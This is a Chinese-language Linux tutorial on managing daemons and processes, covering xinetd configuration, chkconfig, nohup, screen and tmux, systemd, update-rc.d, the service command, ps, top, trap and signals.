/etc/init.d/      # 该目录存放所有stand alone型daemon的初始化脚本。
/etc/sysconfig/   # 该目录存放所有daemon的初始化配置文件。
/etc/xinetd.conf  # 该文件是super daemon的配置文件。 该文件将会加载/etc/xinetd.d/目录下的所有配置文件。
/etc/xinetd.d/    # 该目录存放所有被super daemon管理的daemon的配置文件。 daemon启动或关闭就在这些配置文件中配置。
/etc/             # 该目录存放各daemon各自的配置文件。
/var/lib/         # 该目录存放各daemon的数据库文件。
/var/run/         # 该目录记录各daemon的PID。

super daemon的配置
super daemon的配置文件,默认配置文件为:/etc/xinetd.conf,为它所管理的所有daemon做了一些默认的配置,从最后一行的includedir /etc/xinetd.d可以看出,它加载了它所管理的所有daemon的配置:

defaults
{
# The next two items are intended to be a quick access place to
# temporarily enable or disable services.
#
#       enabled         =
#       disabled        =

# Define general logging characteristics.
        log_type        = SYSLOG daemon info
        log_on_failure  = HOST
        log_on_success  = PID HOST DURATION EXIT

# Define access restriction defaults
#
#       no_access       =
#       only_from       =
#       max_load        = 0
        cps             = 50 10
# Address and networking defaults
#
#       bind            =
#       mdns            = yes
        v6only          = no

# setup environmental attributes
#
#       passenv         =
        groups          = yes
        umask           = 002

# Generally, banners are not used. This sets up their global defaults
#
#       banner          =
#       banner_fail     =
#       banner_success  =
}

includedir /etc/xinetd.d

下面来看一下具体的某个daemon的配置:
service rsync           #service后为daemon的名字
{
        disable = yes #yes表示关闭此daemon,no表示开启此daemon
        socket_type     = stream#stream表示使用TCP、dgram表示使用UDP、raw表示直接与IP交互
        wait            = no
        user            = root#以什么用户的身份启动这个daemon
        server          = /usr/bin/rsync#这个daemon的启动程序
        server_args     = --daemon#启动时所需的参数
        log_on_failure  += USERID#登录失败时需要记录用户
}

=:表示将某个参数设为等号右侧的值,若先前设置中已设置过该参数,则直接覆盖
+=:表示保留先前设置的这个参数,再给这个参数增加个值。
-和-=的含义同上。
super daemon的防火墙配置

由于受super daemon管理的daemon的请求都首先需要经过super daemon,因此super daemon可以充当防火墙的角色,拒绝一些不安全的请求。
super daemon提供了两种防火墙机制,第一种方式提供较多详细的安全设置,而第二种方式只能阻挡或允许指定的IP,具体见下:

方式一:使用首super daemon管理的daemon的配置文件实现防火墙机制
在某个具体的daemon配置文件中添加如下参数,即可为daemon配置防火墙:

instance=数字/UNLIMITED:设置该daemon能够承受的最大连接数。
per_source=数字/UNLIMITED:每个IP的最大连接数。
Cps=数字1 数字2:该daemon在一秒内的连接数超过数字1,则暂时关闭该daemon数字2的秒数。
log_on_success/failure=PID/HOST/USERID/EXIT/DURATION:当登录成功/失败时记录的信息。HOST:连接者的IP、EXIT:离开时间、DURATION:为该用户服务的时间。
redirect=IP:将用户的请求转至指定服务器。
bind=IP:允许用户用哪个IP访问本服务。
only_from=[0.0.0.0,192.168.1.0:24]:只允许指定IP的用户访问。0.0.0.0表示允许所有用户,192.168.1.0:24表示只允许192.168.1.1－192.168.1.255之间的用户访问。
access_time=00:00-12:00:只允许该时间段内访问。

方式二:使用xinetd提供的/etc/hosts.allow和/etc/hosts.deny实现防火墙机制
/etc/hosts.allow
可以在该文件中设置允许访问的IP

/etc/hosts.deny
可以在该文件中设置不允许访问的IP

设置Daemon开启启动
Linux启动时可以选择有不同的开机等级,不同等级将会开启不同的系统服务,窗口界面的执行等级为level5,命令行的执行等级为level3
可以用chkconfig命令来查看和设置开机启动的服务:

查看chkconfig –list [指定服务的开机启动情况]
NetworkManager  0:off   1:off   2:off   3:off   4:off   5:off   6:off
acpid           0:off   1:off   2:off   3:off   4:off   5:off   6:off
aegis           0:off   1:off   2:on    3:on    4:on    5:on    6:off
anacron         0:off   1:off   2:off   3:off   4:off   5:off   6:off
atd             0:off   1:off   2:off   3:off   4:off   5:off   6:off

xinetd based services:
chargen-dgram:  off
chargen-stream: off
daytime-dgram:  off
daytime-stream: off

可以看到,所有的服务被分成两块,一块是stand alone型的daemon,一块是被super daemon管理的daemon。我们可以发现,只有stand alone型的daemon才拥有执行等级。

chkconfig –level [0123456] [服务名称] [on/off]
chkconfig --level 3 redis on  # 将redis在level3情况下设为开机自启

设置成功之后可以看到,redis在level3下已经on:
[root@i]# chkconfig --list redis
redis           0:off   1:off   2:off   3:on    4:off   5:off   6:off

【 前台任务foreground job和后台任务background job 】
只要在命令的尾部加上符号&,启动的进程就会成为"后台任务",如$ node server.js &
如果要让正在运行的"前台任务"变为"后台任务",可以先按ctrl + z,然后执行bg命令(让最近一个暂停的"后台任务"继续执行)

"后台任务"有两个特点。
1、继承当前 session(对话)的标准输出(stdout)和标准错误(stderr)。因此,后台任务的所有输出依然会同步地在命令行下显示。
2、不再继承当前 session 的标准输入(stdin)。你无法向这个任务输入指令了。如果它试图读取标准输入,就会暂停执行(halt)。
可以看到,"后台任务"与"前台任务"的本质区别只有一个:是否继承标准输入。所以,执行后台任务的同时,用户还可以输入其他命令。

变为"后台任务"后,一个进程是否就成为了守护进程呢？或者说用户退出session以后,"后台任务"是否还会继续执行？
Linux系统是这样设计的。
1、用户准备退出session
2、系统向该session发出SIGHUP信号
3、session将SIGHUP信号发给所有子进程
4、子进程收到SIGHUP信号后,自动退出

上面的流程解释了,为什么"前台任务"会随着session的退出而退出:因为它收到了SIGHUP信号。
"后台任务"是否也会收到SIGHUP信号？这由Shell 的huponexit参数决定的。
$ shopt | grep huponexit
执行上面的命令,就会看到huponexit参数的值。
大多数Linux系统,这个参数默认关闭(off)。因此,session 退出的时候,不会把SIGHUP信号发给"后台任务"。所以,一般来说,"后台任务"不会随着 session 一起退出。

通过"后台任务"启动"守护进程"并不保险,因为有的系统的huponexit参数可能是打开的(on)。

【 disown命令 】
disown命令可以将指定任务从"后台任务"列表(jobs命令的返回结果)之中移除。一个"后台任务"只要不在这个列表之中,session就肯定不会向它发出SIGHUP信号。

$ node server.js &
$ disown
执行上面的命令以后server.js进程就被移出了"后台任务"列表,可以执行jobs命令验证,输出结果里面不会有这个进程。

disown的用法:
$ disown  # 移出最近一个正在执行的后台任务
$ disown -r  # 移出所有正在执行的后台任务
$ disown -a  # 移出所有后台任务
$ disown -h  # 不移出后台任务,但是让它们不会收到SIGHUP信号

# 根据jobId,移出指定的后台任务
$ disown %2
$ disown -h %2

【 标准I/O 】
使用disown命令之后,还有一个问题就是退出session以后,如果后台进程与标准I/O有交互,它还是会挂掉

var http = require('http');

http.createServer(function(req, res) {
  console.log('server starts...'); // 加入此行
  res.writeHead(200, {'Content-Type': 'text/plain'});
  res.end('Hello World');
}).listen(5000);

启动上面的脚本,然后再执行disown命令。
$ node server.js &
$ disown

接着退出 session,访问5000端口,就会发现连不上。
这是因为"后台任务"的标准 I/O 继承自当前 session,disown命令并没有改变这一点。一旦"后台任务"读写标准 I/O,就会发现它已经不存在了,所以就报错终止执行。
为了解决这个问题,需要对"后台任务"的标准 I/O 进行重定向。
$ node server.js > stdout.txt 2> stderr.txt < /dev/null &
$ disown
上面这样执行,基本上就没有问题了

【 nohup命令 】
$ nohup node server.js &
nohup命令对server.js进程做了三件事。
1、阻止SIGHUP信号发到这个进程。
2、关闭标准输入。该进程不再能够接收任何输入,即使运行在前台。
3、重定向标准输出和标准错误到文件nohup.out。

在Linux下如果要执行的shell命令耗时特别长,并且网络不稳定,随时可能断网,或在执行了shell命令之后必须要关闭终端软件就需要以脱离终端的方式在后台运行这个shell命令。

方法如下:
(1)输入命令:nohup shell命令 &
(2)回车,使终端回到shell命令行;
(3)输入exit命令退出终端:exit
(4)现在可以关闭终端软件了,等过足够的时间,让shell命令执行完了再上去看结果

nohup命令实际上将子进程与它所在的session分离了,nohup命令可以让shell命令忽略SIGHUP信号即可以使之脱离终端运行
脱离终端的方式在后台运行shell命令的好处:只要执行过了命令,那么网络中断不会对你有任何影响,并且就可以关闭终端软件了
nohup命令不会自动把进程变为"后台任务",所以必须加上&符号

【 Screen命令与Tmux命令 】
另一种思路是使用terminal multiplexer(终端复用器:在同一个终端里面,管理多个session),典型的就是Screen命令和Tmux命令。
它们可以在当前session里面新建另一个session,这样的话当前session一旦结束,不影响其他session,而且以后重新登录还可以再连上早先新建的session

Screen的用法如下
# 新建一个session
$ screen
$ node server.js
然后按下ctrl + A和ctrl + D,回到原来的session,从那里退出登录,下次登录时再切回去。

$ screen -r
如果新建多个后台 session,就需要为它们指定名字。

$ screen -S name

# 切回指定session
$ screen -r name
$ screen -r pid_number

# 列出所有session
$ screen -ls
如果要停掉某个session,可以先切回它,然后按下ctrl + c和ctrl + d

Tmux比Screen功能更多、更强大,它的基本用法如下
$ tmux
$ node server.js

# 返回原来的session
$ tmux detach
除了tmux detach,另一种方法是按下Ctrl + B和d ,也可以回到原来的session

# 下次登录时返回后台正在运行服务session
$ tmux attach
如果新建多个session就需要为每个session指定名字

# 新建session
$ tmux new -s session_name

# 切换到指定session
$ tmux attach -t session_name

# 列出所有session
$ tmux list-sessions

# 退出当前session,返回前一个session
$ tmux detach

# 杀死指定session
$ tmux kill-session -t session-name

【 Node工具 】
对于Node应用来说可以不用上面的方法,有一些专门用来启动的工具:forever,nodemon和pm2

【 Systemd 】
除了专用工具以外,Linux系统有自己的守护进程管理工具Systemd。它是操作系统的一部分,直接与内核交互,性能出色,功能极其强大。完全可以将程序交给Systemd,让系统统一管理,成为真正意义上的系统服务

历史上Linux的启动一直采用init进程
下面的命令用来启动服务。
$ sudo /etc/init.d/apache2 start
# 或者
$ service apache2 start

这种方法有两个缺点
一是启动时间长。init进程是串行启动,只有前一个进程启动完才会启动下一个进程。
二是启动脚本复杂。init进程只是执行启动脚本,不管其他事情。脚本需要自己处理各种情况,这往往使得脚本变得很长。

Systemd就是为了解决这些问题而诞生的,它的设计目标是为系统的启动和管理提供一套完整的解决方案。
根据Linux惯例字母d是守护进程(daemon)的缩写。Systemd这个名字的含义就是它要守护整个系统。

使用了Systemd就不需要再用init了。Systemd取代了initd成为系统的第一个进程(PID等于1),其他进程都是它的子进程。

$ systemctl --version
上面的命令查看Systemd的版本。
Systemd的优点是功能强大,使用方便,缺点是体系庞大,非常复杂。事实上现在还有很多人反对使用Systemd,理由就是它过于复杂,与操作系统的其他部分强耦合,违反"keep simple, keep stupid"的Unix哲学

Systemd并不是一个命令,而是一组命令,涉及到系统管理的方方面面。
systemctl是Systemd的主命令,用于管理系统。
systemd-analyze命令用于查看启动耗时
hostnamectl命令用于查看当前主机的信息
localectl命令用于查看本地化设置
timedatectl命令用于查看当前时区设置
loginctl命令用于查看当前登录的用户

$ sudo systemctl reboot  # 重启系统
$ sudo systemctl poweroff  # 关闭系统,切断电源
$ sudo systemctl halt  # CPU停止工作
$ sudo systemctl suspend  # 暂停系统
$ sudo systemctl hibernate  # 让系统进入冬眠状态
$ sudo systemctl hybrid-sleep  # 让系统进入交互式休眠状态
$ sudo systemctl rescue  # 启动进入救援状态(单用户状态)

</pre>

<h4>update-rc.d命令</h4><pre>
Ubuntu系统中update-rc.d命令是用来更新系统启动项的脚本,这些脚本的链接位于/etc/rcN.d/目录,对应脚本位于/etc/init.d/目录
此命令用于安装或移除System-V风格的初始化脚本连接。脚本是存放在/etc/init.d/目录下的,当然可以在此目录创建连接文件连接到存放在其他地方的脚本文件

用法
update-rc.d [-n] [-f] name remove 用于移除脚本。
update-rc.d [-n] name default [NN | SS KK],NN表示执行序号(0-99),SS表示启动时的执行序号,KK表示关机时的执行序号,SS、KK主要用于在脚本直接的执行顺序上有依赖关系的情况下。

选项
-n:不做任何事情,只显示将要做的。(预览、做测试)
-f:强制移除符号连接,即使/etc/init.d/script-name仍然存在。

Linux系统主要启动步骤
1、读取MBR的信息,启动Boot Manager。
2、加载系统内核,启动init进程,init进程是Linux的根进程,所有的系统进程都是它的子进程。
3、init进程读取/etc/inittab文件中的信息,并进入预设的运行级别。通常情况下/etc/rcS.d/目录下的启动脚本首先被执行,然后是/etc/rcN.d/目录。
4、根据/etc/rcS.d/文件夹中对应的脚本启动Xwindow服务器xorg,Xwindow为Linux下的图形用户界面系统。
5、启动登录管理器,等待用户登录。

【 linux系统运行级别 】
0:halt关机
1:single user mode单用户模式,开启最少的服务以保证系统的运行,类似于win的安全模式,主要用于系统修复
2:不完全的命令行模式,不含NFS(linux间的文件共享)服务
3:full multiuser mode完全的命令行模式,即标准的字符界面
4:unused系统保留
5:xll图形模式
6:reboot重启动

# runlevel         # 查看上一个系统和当前系统的运行级别
# init 运行级别     # 修改运行级别
# vi /etc/inittab  # 修改配置文件,指定系统开机之后直接进入哪个运行级别,进入字符界面
- id:3:initdefault:

启动项管理工具
1  sudo install sysv-rc-conf // 或使用带gui的工具bum
2  sudo sysv-rc-conf

从所有的运行级别中删除指定启动项,-f选项表示强制执行
update-rc.d -f ＜basename＞ remove

按指定顺序、在指定运行级别中启动或关闭
update-rc.d ＜basename＞ start|stop ＜order＞ ＜runlevels＞
order表示启动顺序取值范围是0-99,序号越大的越晚执行
runlevels表示运行级别

实例:update-rc.d apachectl start 20 2 3 4 5 . stop 20 0 1 6 .
解析:表示在2、3、4、5这五个运行级别中,由小到大,第20个开始运行apachectl;在 0 1 6这3个运行级别中,第20个关闭apachectl。这是合并起来的写法,注意它有2个点号,效果等于下面方法:
update-rc.d apachectl defaults

A启动后B才能启动,B关闭后A才关闭
update-rc.d A defaults 80 20
update-rc.d B defaults 90 10

启动和关闭顺序为90,级别默认
update-rc.d ＜basename＞ defaults 90

如果执行脚本B需要先执行脚本A,如下设置(A的启动顺序比B的小,结束顺序比B的大):
update-rc.d script_for_A defaults 80 20
update-rc.d script_for_B defaults 90 10

添加一个不被其他任何服务需要的服务:update-rc.d script_name defaults 98 02,
添加一个需要 开始/结束 序号在20的服务的服务:update-rc.d script_depends_on_service_20 default 21 19。
移除一个脚本,假定/etc/init.d/目录下的脚本文件已先被删除:update-rc.d script_name remove。
移除一个脚本,不管/etc/init.d/目录下的脚本文件是否已删除:update-rc.d -f script_name remove

实例
用update-rc.d命令添加开机执行脚本
创建要开机自动执行的脚本:/home/test/blog/startBlog.sh
给予可执行权限:chmod +x /home/test/blog/startBlog.sh。
在/etc/init.d目录下创建链接文件到前面的脚本: ln -s /home/test/blog/startBlog.sh /etc/init.d/startBlog。
进入/etc/init.d目录,用update-rc.d命令将连接文件startBlog添加到启动脚本中去:update-rc.d startBlog defaults 99。
移除启动的脚本:update-rc.d -f startBlog remove。

</pre>

<h4>service命令</h4><pre>
service命令用于对系统服务进行管理,如启动(start)、停止(stop)、重启(restart)、查看状态(status)等。
相关的命令还包括chkconfig、ntsysv等,chkconfig用于查看、设置服务的运行级别,ntsysv用于直观方便的设置各个服务是否自动启动

service的绝对路径为/sbin/service,service命令本身是一个shell脚本,它在/etc/init.d/目录查找指定的服务脚本,然后调用该服务脚本来完成任务

service运行指定服务(称之为System V初始脚本)时,把大部分环境变量去掉了,只保留LANG和TERM两个环境变量,并且把当前路径置为/,也就是说是在一个可以预测的非常干净的环境中运行服务脚本。这种脚本保存在/etc/init.d目录中,它至少要支持start和stop命令。

可以将service命令替换为/etc/init.d/mysqld stop(因为有一些linux的版本不支持service)

语法
service(选项)(参数)

选项
-h:显示帮助信息;
service --help | -h | --version
service --status-all:显示所有服务的状态,带+号表示该服务已启动

$ service --status-all
 [ - ]  apparmor
 [ ? ]  apport
 [ - ]  atd
 [ - ]  console-setup.sh
 [ - ]  cron
 [ ? ]  cryptdisks
 [ - ]  cryptdisks-early
 [ - ]  dbus
 [ - ]  ebtables
 [ ? ]  hwclock.sh
 [ + ]  irqbalance
 [ + ]  iscsid

参数
服务名:自动要控制的服务名,即/etc/init.d目录下的脚本文件名;
控制命令:系统服务脚本支持的控制命令。

service service_name # 打印指定服务service_name的命令行使用帮助。
service service_name start # 启动指定的系统服务service_name
service service_name stop # 停止指定的系统服务service_name
service service_name restart # 重新启动指定的系统服务service_name,即先停止(stop),然后再启动(start)。

chkconfig --list # 查看系统服务列表,以及每个服务的运行级别。
chkconfig service_name on # 设置指定服务service_name开机时自动启动。
chkconfig service_name off # 设置指定服务service_name开机时不自动启动。

格式:ntsysv
以全屏幕文本界面设置服务开机时是否自动启动。

【 原理 】
service脚本主要作了如下两点:
1.初始化执行环境变量PATH和TERM
PATH=/sbin:/usr/sbin:/bin:/usr/bin
TERM,为显示外设的值,一般为xterm

2.调用/etc/init.d/文件夹下的相应脚本,脚本的参数为service命令第二个及之后的参数

以service mysqld restart为例
mysqld为/etc/init.d/中一个可执行文件
# ll /etc/init.d/mysql
-rwxr-xr-x. 1 root root 10815 Jan 14 2014 /etc/init.d/mysql

restart为参数,将传递给mysqld脚本

这个命令在service执行到后面最终调用:
env -i PATH="$PATH" TERM="$TERM" "${SERVICEDIR}/${SERVICE}" ${OPTIONS}
相当于执行了如下命令
/etc/init.d/mysqld restart

【 实例 】
mysql nginx networking php7.0-fpm redis-server

开启httpd服务器
service httpd start

重启mysql
service mysqld status
service mysqld restart

当修改了主机名、ip地址等信息时经常需要把网络重启使之生效。
service networking status
service network restart

【 把可执行程序做成一个服务 】
linux系统启动时可以看到很多服务性程序一个接一个的被启动,这些在后台运行的程序对使用计算机起了很重要的作用,以这种方式运行的程序有以下特点:
开机启动,关机停止,后台运行
通过service命令控制或查看对应的程序的运行状态

把编制的程序做成这样的一个服务呢主要分以下3步:
1、把可执行程序放到一个linux系统可以找到的地方。
在linux命令提示符下输入env,回车后可看到环境变量,里面有一项PATH指定的目录都是系统可找到的地方,把可执行程序放入其中的一个目录下即可,一般放在/usr/sbin/目录下

2、在目录/etc/init.d/下,新建一个以服务名为文件名的文件。
如果打开目录/etc/init.d/看到的文件其实都是服务程序文件,每个文件的内容都大同小异,这里的文件在文件结构上几乎是一样的。几乎每个文件都有start、stop、restart和status这样的标志,新建的这个文件也具有相同的结构,只是在这些标志内部把相应的可执行程序换成自己的可执行程序即可,复制——修改——保存

3、在目录/etc/rc3.d/下,新建一个指向在第2步中建立的服务文件的符号连接文件。
打开目录/etc/rc3.d/看到这里都是符号连接文件(相当于windows中的快捷方式),采用以下命令格式:
ln -sf 目标文件名 连接文件名
连接文件名益采用"SXX目标文件名"的格式,其中XX一般是一个从1到100的整数,它表示启动优先级,数字越大优先级越低,比如:服务A的运行要依赖服务B,那A的XX数字就应该大于B的。后跟"目标文件名"是为了一目了然,一看就知道是哪个文件的符号连接。
目录/etc/rc3.d/是系统启动时自动搜索的目录,该目录下的符号连接文件的目标文件都将被运行,这就是在这个目录建立符号连接的原因,为了开机就运行。

完成以上3个步骤就把自己的一个可执行程序做成系统的一个服务了,可以用service命令控制这个hdz_service程序了:
启动:service hdz_service start
停止:service hdz_service stop
重启:service hdz_service restart

自动化这几个步骤
记录代码文件之间依赖关系的makefile文件,在makefile文件中添加一个标志,并在该标志下添加和下面类似的代码:

install:
 cp ./hdz_pro /usr/sbin/
 cp ./hdz_service /etc/init.d/
 cd /etc/init.d/
 chmod +x hdz_service
 cd /etc/rc3.d/
 ln -sf ../init.d/hdz_service ./S99hdz_service

在标志install下的每一句话前面一定要留空白,这不仅是有利于阅读,更是一个要求,makefile文件要求每一句可执行语句前都要有空白(空格或tab)。
上面代码中的hdz_pro和hdz_service分别是可执行文件名和服务名,这两个名称换成自己的就行了,操作时用make install命令运行完就一切OK

【 自定义系统命令 】
$ mv shellfile ~/bin
$ cd ~/bin && ln -s shellfile sf    # 设置别名

</pre>

<h4>ps命令</h4><pre>
ps是Process Status的缩写,用于查看系统中的进程状态,ps命令列出当前那些进程的快照,即执行ps命令的那个时刻的进程,如果想动态连续的显示进程信息对进程时间监控应该用top命令
使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等
系统每执行一个program就会在系统底层开启一个process

最常用的方法是ps -aux,再利用一个管道符号导向到grep去查找特定的进程,然后再对特定的进程进行操作
$ ps aux
$ ps -ef
$ ps -u yourusername   # 列出你的进程
$ ps -ajft             # 父进程子进程
$ pstree -ap           # 查看进程的树模型

# 提取进程id,用grep -v参数可以将grep命令排除掉
$ ps -def | grep dragonfly-framework | grep -v grep | awk '{print $2}'

命令参数
a  显示使用该终端tty的所有进程,包括其他用户的程序
-a 显示同一终端下的所有程序
-A 显示所有进程,同-e
c  显示进程的真实名称,列出程序时显示每个程序真正的指令名称而不包含路径,参数或常驻服务的标示
-N 选择除满足指定条件以外的所有进程。(否定选择)与--deselect相同
-e 等于"-A",例如ps -e|grep sshd
e  显示每个程序所使用的环境变量
f  用ASCII字符显示树状结构表达程序间的相互关系
h  隐藏结果的标题行
-H 显示树状结构表示程序间的相互关系
r  显示当前终端的进程
T  显示当前终端的所有程序,选择与该终端相关的所有进程。与不带任何参数的t选项相同
s  采用程序信号的格式显示程序状况。
S  列出程序时,包括已中断的子程序资料。
-t<终端机编号> 指定终端机编号,并列出属于该终端机的程序的状况。
u  以用户为主的格式来显示程序状况
x  显示所有程序,不以终端机来区分
-au 显示较详细的资讯
-aux 显示所有包含其他使用者的进程
-C<命令> 列出指定命令的状况
--lines<行数> 每页显示的行数
--width<字符数> 每页显示的字符数
--help 显示帮助信息
--version 显示版本显示

ps aux |grep -v USER | sort -nk +4 | tail   # 显示消耗内存最多的10个运行中的进程,以内存使用量排序.cpu +3

a=`ps -auxh|grep node|awk '{print $2}'`
for x in seq $a; do kill $x; done        # 结束node的所有进程

$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   8304   108 ?        Ss   11:17   0:00 /init ro
root         3  0.0  0.0   8304    76 tty1     Ss   11:17   0:00 /init ro
berlin75     4  0.0  0.0  15156  2588 tty1     S    11:17   0:01 -bash
berlin75   167  0.0  0.0  15664  1836 tty1     R    19:57   0:00 ps aux

$ ps auxh
root         1  0.0  0.0   8304   108 ?        Ss   11:17   0:00 /init ro
root         3  0.0  0.0   8304    76 tty1     Ss   11:17   0:00 /init ro
berlin75     4  0.0  0.0  15156  2588 tty1     S    11:17   0:01 -bash
berlin75   167  0.0  0.0  15664  1836 tty1     R    19:57   0:00 ps aux

• USER:该进程属于那个使用者账号的
• PID :该进程的进程ID号
• %CPU:该进程使用掉的 CPU 资源百分比
• %MEM:该进程所占用的物理内存百分比
• VSZ :该进程使用掉的虚拟内存量(Kbytes)
• RSS :该进程占用的固定的内存量(Kbytes)
• TTY :该进程是在那个终端机上面运作,若与终端机无关则显示 ?,tty1-tty6是本机上面的登入者程序,若为pts/0等等的,则表示为由网络连接进主机的程序
• STAT:该程序目前的状态,主要的状态有:
   R :该程序目前正在运作,或者是可被运作;
   S :该程序目前正在睡眠当中(可说是idle状态),但可被某些讯号(signal)唤醒。
   T :该程序目前正在侦测或者是停止了;
   Z :该程序应该已经终止,但是其父程序却无法正常的终止他,造成zombie(疆尸)程序的状态
• START:该进程被触发启动的时间;
• TIME :该进程实际使用CPU运作的时间。
• COMMAND:该程序的实际指令

显示每个程序所使用的环境变量
$ ps e
PID TTY  STAT TIME COMMAND
  4 tty1 S    0:01 -bash HOSTTYPE=x86_64 LANG=en_US.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/g
170 tty1 R    0:00 ps e SHELL=/bin/bash TERM=xterm-256color OLDPWD=/home/berlin75 USER=berlin75 NAME=LAPTOP-0KMQM01D LS_COLORS=rs=0:di=01;34:ln=01;

使用用户自定义的格式查看每个进程
$ ps axo user,pid,priority,nice,command
USER       PID PRI  NI COMMAND
root         1  20   0 /init ro
root         3  20   0 /init ro
berlin75     4  20   0 -bash
berlin75   174  20   0 ps axo user,pid,priority,nice,command

$ ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:17 ?        00:00:00 /init ro
root         3     1  0 11:17 tty1     00:00:00 /init ro
berlin75     4     3  0 11:17 tty1     00:00:01 -bash
berlin75   169     4  0 20:03 tty1     00:00:00 ps -ef

$ ps -l
F S   UID   PID  PPID  C PRI  NI ADDR SZ  WCHAN TTY          TIME CMD
0 S  1000     4     3  0  80   0 -  3789      - tty1     00:00:01 bash
0 R  1000   166     4  3  80   0 -  3844      - tty1     00:00:00 ps

各相关信息的意义为:
• F 代表这个程序的flag,4代表使用者为superuser
• S 代表这个程序的状态(STAT)
• UID 代表执行者身份
• PID 进程的ID号
• PPID 则父进程的ID;
• C 表示CPU使用的资源百分比
• PRI指进程的执行优先权(Priority),其值越小越早被执行
• NI 这个进程的nice值,其表示进程可被执行的优先级的修正数值。
• ADDR 这个是内核函数,指出该程序在内存的那个部分。如果是个执行的程序一般就是『-』
• SZ 使用掉的内存大小
• WCHAN 目前这个程序是否正在运作当中,若为-表示正在运作
• TTY 登入者的终端机位置
• TIME 使用掉的CPU时间
• CMD 所下达的指令名称

在Linux系统中有5种常见的进程状态和状态码
R(运行 runnable(on run queue):进程正在运行或在运行队列中等待。
S(中断 sleeping ):进程处于休眠中,当某个条件形成后或者接收到信号时,则脱离该状态。
D(不可中断 uninterruptible sleep(usually IO):进程不响应系统异步信号,即便用kill命令也不能将其中断。
Z(僵死 a defunct("zombie") process):进程已经终止,但进程描述符依然存在,直到父进程调用wait4()系统函数后将进程释放。
T(停止 traced or stopped ):进程收到停止信号后停止运行。

</pre>

<h4>top命令</h4><pre>
用于动态地监视进程活动与系统负载等信息
$ top                       # 显示当前活动的进程,查看后台程序,监控系统性能
$ top -d 2                  # 每两秒列新一次
$ top -d 2 -p3690          # 查看某个PID
$ top -b -n 2 >/tmp/top.txt # 将top的信息进行2次,然后将结果输出到/tmp/top.txt

</pre>

<h4>pidof命令</h4><pre>
用于查询某个指定服务进程的PID值,格式为"pidof [参数] [服务名称]"
$ pidof firefox-bin
1827

$ pgrep firefox
1827

</pre>

<h4>trap命令</h4><pre>
用于捕获指定的信号并执行预定义的命令,常见用途是在脚本程序被中断时完成清理工作

shell总是用数字来代表信号,而新的脚本程序应该使用信号的名字,它们保存在用#include命令包含进来的signal.h头文件中在使用信号名时需要省略SIG前缀。可以在命令提示符下输入命令trap -l或kill -l来查看信号编号及其关联的名称。

语法: trap `command` signal
signal是要捕获的信号,command是捕获到指定的信号所要执行的命令,可以用kill -l命令看到系统中全部可用的信号名,捕获信号后所执行的命令可以是一条或多条合法的Shell语句,也可以是一个函数名

trap [-lp] [[arg] sigspec ...]
当shell接收到sigspec指定的信号时,arg参数将会被读取并执行
trap "exit 1" HUP INT PIPE QUIT TERM
表示当shell收到HUP INT PIPE QUIT TERM这几个命令时,当前执行的程序会读取参数"exit 1",并将它作为命令执行

可以用在shell中用trap定义自己的信号处理程序,就象在c中用signal一样,
trap "echo 'GO Away'" INT

选项参数
如果arg参数缺省或为"-",每个接收到的sigspec信号都将会被重置为它们进入shell时的值;
如果arg是空字符串每一个由sigspec指定的信号都会被shell和它所调用的命令忽略;
如果有-p选项而没有提供arg参数则会打印所有与sigspec指定信号相关联的的trap命令;
如果没有提供任何参数或者仅有-p选项,trap命令将会打印与每一个信号有关联的命令的列表;
-l选项的作用是让shell打印一个命令名称和其相对应的编号的列表。

每个sigspec信号都是是以名字或编号的形式定义在signal.h头文件中,信号的名字是不区分大小写的,其前缀SIG是可选的,如果某个信号是EXIT(0),那么arg指定的命令将会在shell上执行退出命令时执行(If a sigspec is EXIT(0) the command arg is executed on exit from the shell),如果sigspec是DEBUG,那么arg指定的命令将会在以下每个命令执行之前执行:
简单命令,for语句,case语句,select命令,算法命令,在函数内的第一条命令。
更多trap debug的使用可以参考extdebug选项说明。

如果sigspec是ERR,arg参数指定的命令将会在任何简单命名执行完后返回值为非零值时执行,但是也有以下例外情况:
1、如果执行失败的命令是紧跟在while或者until关键字之后的一组命令中的一部分时
2、如果执行失败的命令是if测试语句的一部分时,是 && 和 ||连接的列表中的一部分时
3、如果执行失败的命令的返回值是被取反过的(通过!操作符)
在以上情况中如果sigspec是ERR,arg命令不会执行,这些规则同样适用于errexit选项。如果sigspec是RETURN,arg指定的命令在每次shell函数或者脚本用"."或者内置的命令执行完成后执行,在shell入口处被忽略的命令 是没法被trap和reset的,被trap的信号,在创建的子进程中使用时会在子进程被创建时被重置为原始的值。如果trap使用的sigspec信号 是invalid的信号则trap命令返回false(失败),否则返回成功(true)

【 Linux信号 】
信号是一种进程间通信机制,它给应用程序提供一种异步的软件中断,使应用程序有机会接受其他程序活终端发送的命令(即信号)。
Linux使用信号与系统上运行的进程进行通信。
可以使用这些信号控制Shell脚本的运行,只需要让shell脚本在接收到来自Linux系统的特定信号时执行命令即可

Linux系统中信号被用于进程间的通信。信号是一个发送到某个进程或同一进程中的特定线程的异步通知,用于通知发生的一个事件。
在Shell中可以使用kill、pkill和killall命令发送信号,或使用trap命令捕获信号

kill -l和trap -l命令都可以列出系统的信号名称

$ kill -l
 1) SIGHUP       2) SIGINT       3) SIGQUIT      4) SIGILL       5) SIGTRAP
 6) SIGABRT      7) SIGBUS       8) SIGFPE       9) SIGKILL     10) SIGUSR1
11) SIGSEGV     12) SIGUSR2     13) SIGPIPE     14) SIGALRM     15) SIGTERM
16) SIGSTKFLT   17) SIGCHLD     18) SIGCONT     19) SIGSTOP     20) SIGTSTP
21) SIGTTIN     22) SIGTTOU     23) SIGURG      24) SIGXCPU     25) SIGXFSZ
26) SIGVTALRM   27) SIGPROF     28) SIGWINCH    29) SIGIO       30) SIGPWR
31) SIGSYS      34) SIGRTMIN    35) SIGRTMIN+1  36) SIGRTMIN+2  37) SIGRTMIN+3
38) SIGRTMIN+4  39) SIGRTMIN+5  40) SIGRTMIN+6  41) SIGRTMIN+7  42) SIGRTMIN+8
43) SIGRTMIN+9  44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13
48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12
